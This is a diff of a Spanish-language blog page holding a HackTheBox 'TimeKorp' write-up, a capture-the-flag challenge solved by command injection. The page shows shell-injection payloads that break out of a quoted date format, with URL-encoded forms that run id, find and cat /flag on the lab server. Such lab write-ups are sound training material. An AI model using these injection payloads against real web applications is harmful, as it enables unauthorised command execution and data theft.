@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 
 <head>
   <title>
@@ -14,23 +14,23 @@
 
 <meta name="author" content="CeleroRKX">
 <meta name="description" content="Este es challenge se toca la vulnerabilidad Command Injection">
-<meta name="keywords" content="blog,developer,personal">
+<meta name="keywords" content="ciberseguridad, pentesting, hacking ético, HackTheBox, writeups, redes, eJPT, CWES">
 
 
 
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="TimeKorp Web Challenge - HackTheBox">
-  <meta name="twitter:description" content="Este es challenge se toca la vulnerabilidad Command Injection">
+	<meta name="twitter:card" content="summary">
+	<meta name="twitter:title" content="TimeKorp Web Challenge - HackTheBox">
+	<meta name="twitter:description" content="Este es challenge se toca la vulnerabilidad Command Injection">
 
 <meta property="og:url" content="https://celero0.github.io/posts/timekorp/">
-  <meta property="og:site_name" content="Celero0 Blog">
-  <meta property="og:title" content="TimeKorp Web Challenge - HackTheBox">
-  <meta property="og:description" content="Este es challenge se toca la vulnerabilidad Command Injection">
-  <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2026-04-02T18:08:15+00:00">
-    <meta property="article:modified_time" content="2026-04-02T18:08:15+00:00">
+	<meta property="og:site_name" content="Celero0 Blog">
+	<meta property="og:title" content="TimeKorp Web Challenge - HackTheBox">
+	<meta property="og:description" content="Este es challenge se toca la vulnerabilidad Command Injection">
+	<meta property="og:locale" content="es">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="posts">
+		<meta property="article:published_time" content="2026-04-02T18:08:15+00:00">
+		<meta property="article:modified_time" content="2026-04-02T18:08:15+00:00">
 
 
 
@@ -45,7 +45,7 @@
 
   
   
-  <link rel="stylesheet" href="/css/coder.min.4b392a85107b91dbdabc528edf014a6ab1a30cd44cafcd5325c8efe796794fca.css" integrity="sha256-SzkqhRB7kdvavFKO3wFKarGjDNRMr81TJcjv55Z5T8o=" crossorigin="anonymous" media="screen" />
+  <link rel="stylesheet" href="/css/coder.min.7931813641e92789c3090650cf34e053bf0a09b258f1e73ca3b5ba54e5c35b4f.css" integrity="sha256-eTGBNkHpJ4nDCQZQzzTgU78KCbJY8ec8o7W6VOXDW08=" crossorigin="anonymous" media="screen" />
 
 
 
@@ -55,13 +55,19 @@
   
     
     
-    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
+    <link rel="stylesheet" href="/css/coder-dark.min.7bae3723f236dac3024e7729da8f0d026ba33c06ce79d59f1f7a1811c81cd52c.css" integrity="sha256-e643I/I22sMCTncp2o8NAmujPAbOedWfH3oYEcgc1Sw=" crossorigin="anonymous" media="screen" />
   
 
 
 
  
 
+
+  
+  
+    
+    <link rel="stylesheet" href="/scss/custom.min.940f835c40977fce2ddd2fd8c55eb94de7e488a3ba45c0396d26445901b77774.css" integrity="sha256-lA&#43;DXECXf84t3S/YxV65TefkiKO6RcA5bSZEWQG3d3Q=" crossorigin="anonymous" media="screen" />
+  
 
 
 
@@ -90,7 +96,7 @@
 
 
 
-<body class="preload-transitions colorscheme-auto">
+<body class="preload-transitions colorscheme-dark">
   
 <div class="float-container">
     <a id="dark-mode-toggle" class="colorscheme-toggle">
@@ -117,6 +123,14 @@
           
             <li class="navigation-item">
               <a class="navigation-link " href="/posts/">Writeups</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/labs/">Labs</a>
+            </li>
+          
+            <li class="navigation-item">
+              <a class="navigation-link " href="/projects/">Proyectos</a>
             </li>
           
             <li class="navigation-item">
@@ -148,12 +162,12 @@
             <span class="posted-on">
               <i class="fa-solid fa-calendar" aria-hidden="true"></i>
               <time datetime="2026-04-02T18:08:15Z">
-                April 2, 2026
+                2 de abril de 2026
               </time>
             </span>
             <span class="reading-time">
               <i class="fa-solid fa-clock" aria-hidden="true"></i>
-              3-minute read
+              3 minutos de lectura.
             </span>
           </div>
           
@@ -200,30 +214,30 @@
   </a>
 </h2>
 <p>Viendo como responde la web, probablemente el servidor esté ejecutando el siguiente comando</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its %H:%M:%S&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its %H:%M:%S&#39;</span>
 </span></span></code></pre></div><p>Dando como resultado lo que vemos en la web, como se aprecia en el siguiente ejemplo</p>
 <img src="/images/Pasted image 20260402143109.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora si borramos todos los parámetros tendríamos lo siguiente</p>
 <img src="/images/Pasted image 20260402143240.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por tanto sabemos que nuestro input se encuentra acá</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its {input}&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its {input}&#39;</span>
 </span></span></code></pre></div><p>Para poder inyectar comandos debemos cerrar la comilla, y luego podemos comentar todo con un <code>#</code> para evitar errores.</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its &#39;</span>;id <span style="color:#8b949e;font-style:italic">#&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>date <span style="color:#a5d6ff">&#39;+ Its &#39;</span>;id <span style="color:#8b949e;font-style:italic">#&#39;</span>
 </span></span></code></pre></div><p>Quedando de la siguiente manera</p>
 <img src="/images/Pasted image 20260402143439.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Por  lo tanto el parámetro de URL que mandaremos será el siguiente</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/?format<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#f85149">&#39;</span>;id <span style="color:#8b949e;font-style:italic">#</span>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/?format<span style="color:#ff7b72;font-weight:bold">=</span><span style="color:#f85149">&#39;</span>;id <span style="color:#8b949e;font-style:italic">#</span>
 </span></span></code></pre></div><p>Al mandarlo vemos que no nos muestra nada</p>
 <img src="/images/Pasted image 20260402143536.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Esto se debe a que no hemos realizado un <code>URL-Encode</code></p>
 <p>Por tanto realizamos la transformación con el <code>Decoder</code> de <code>Burpsuite</code></p>
 <img src="/images/Pasted image 20260402143650.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Quedando finalmente nuestro parámetro de URL así</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/?format<span style="color:#ff7b72;font-weight:bold">=</span>%27%3b%69%64%20%23
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>/?format<span style="color:#ff7b72;font-weight:bold">=</span>%27%3b%69%64%20%23
 </span></span></code></pre></div><p>Vemos que ahora la web si interpreta nuestro comando <code>id</code></p>
 <img src="/images/Pasted image 20260402143746.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p><strong>NOTA:</strong> Otros payloads que también funcionarían serían los siguientes, con su respectivo <code>URL-Encoded</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; | id #
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#a5d6ff">&#39; | id #
 </span></span></span><span style="display:flex;"><span><span style="color:#a5d6ff">&#39;</span>;ls<span style="color:#f85149">&#39;</span>
 </span></span></code></pre></div><h2 id="obteniendo-la-flag">
   Obteniendo la flag
@@ -233,15 +247,15 @@
   </a>
 </h2>
 <p>Ya sabiendo como inyectar comandos en la web, es sencillo poder leer la flag, para ello primero debemos encontrar la ruta de este, la cual podemos obtener con el comando <code>find</code>, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name *flag* 2&gt;/dev/null
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -name *flag* 2&gt;/dev/null
 </span></span></code></pre></div><p>Integrado a nuestro payload y <code>URL-Encoded</code> quedarías así</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%27%3b%66%69%6e%64%20%2f%20%2d%6e%61%6d%65%20%2a%66%6c%61%67%2a%20%32%3e%2f%64%65%76%2f%6e%75%6c%6c%20%23
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%27%3b%66%69%6e%64%20%2f%20%2d%6e%61%6d%65%20%2a%66%6c%61%67%2a%20%32%3e%2f%64%65%76%2f%6e%75%6c%6c%20%23
 </span></span></code></pre></div><p>Encontrando la ruta <code>/flag</code></p>
 <img src="/images/Pasted image 20260402144110.png" style="width:100%; height:auto; display:block; margin:auto;">
 <p>Ahora solo necesitaríamos leer con <code>cat</code>, de la siguiente forma</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /flag
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat /flag
 </span></span></code></pre></div><p>Integrado a nuestro payload y <code>URL-Encoded</code> quedarías así</p>
-<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%27%3b%63%61%74%20%2f%66%6c%61%67%20%23
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>%27%3b%63%61%74%20%2f%66%6c%61%67%20%23
 </span></span></code></pre></div><p>Así encontramos la <code>flag</code> y terminamos el <code>challenge</code></p>
 <img src="/images/Pasted image 20260402144222.png" style="width:100%; height:auto; display:block; margin:auto;">
 
@@ -271,13 +285,13 @@
   <section class="container">
     ©
     
-      2019 -
+      2025 -
     
     2026
      CeleroRKX 
     ·
     
-    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    Desarrollado por <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
     
   </section>
 </footer>
@@ -291,6 +305,11 @@
   <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
   
 
+  
+  
+  
+  <script src="/js/gestures.min.6cbd91590032e7f15addfe0af40403b55908afeef98fe1be098e196656366619.js" integrity="sha256-bL2RWQAy5/Fa3f4K9AQDtVkIr&#43;75j&#43;G&#43;CY4ZZlY2Zhk="></script>
+  
   
 
   
